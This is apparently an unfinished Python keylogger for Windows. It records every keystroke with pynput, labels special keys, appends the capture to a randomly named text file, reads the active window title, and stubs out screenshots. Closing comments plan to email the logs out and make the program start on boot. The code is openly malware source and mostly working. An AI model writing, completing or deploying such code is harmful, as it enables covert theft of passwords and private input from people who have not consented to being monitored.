from pynput.keyboard import Listener
import win32gui
import listener
import random
import time
import os
import pyautogui

chars = 0
data = []
#kl = []
fileName = str(chars) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'

def on_press(key):
    #global kl
    
    subs = ['Key.enter', ' [ENTER] ', 'Key.backspace', ' [BACKSPACE] ', 'Key.space', ' ',
            'Key.alt_l', ' [ALT] ', 'Key.tab', ' [TAB] ', 'Key.delete', ' [DEL] ', 'Key.ctrl_l', ' [CTRL] ',
            'Key.left', ' [LEFT ARROW] ', 'Key.right', ' [RIGHT ARROW] ', 'Key.shift', ' [SHIFT] ', '\\x13',
            ' [CTRL-S] ', '\\x17', ' [CTRL-W] ', 'Key.caps_lock', ' [CAPS LK] ', '\\x01', ' [CTRL-A] ', 'Key.cmd',
            ' [WINDOWS KEY] ', 'Key.print_screen', ' [PRNT SCR] ', '\\x03', ' [CTRL-C] ', '\\x16', ' [CTRL-V] ']

    keyPressed = "{0}".format(key).replace("'", "")

    if keyPressed in subs:
        data.append(subs[subs.index(keyPressed)+1])
    else:
        data.append(keyPressed)

    print("".join(data)) # debug statement to see chars
    writeLogs(os.path.expandvars("%tmp%"))


def writeLogs(path):
    #path = os.path.expandvars("%tmp%")
    with open(fileName, "a") as f:
        #new_data = [item.strip("'") for item in data]
        f.write(''.join(data))
        f.close()

def appListener():
    appOpen = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if appOpen == "Cortana":
        appOpen = "Windows Start Menu"
        print(appOpen)
    else:
        pass

def takeScreenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")
    #to finish this



# add a function to send the logs via email
# startup keylogger
# possibly adding a window filter 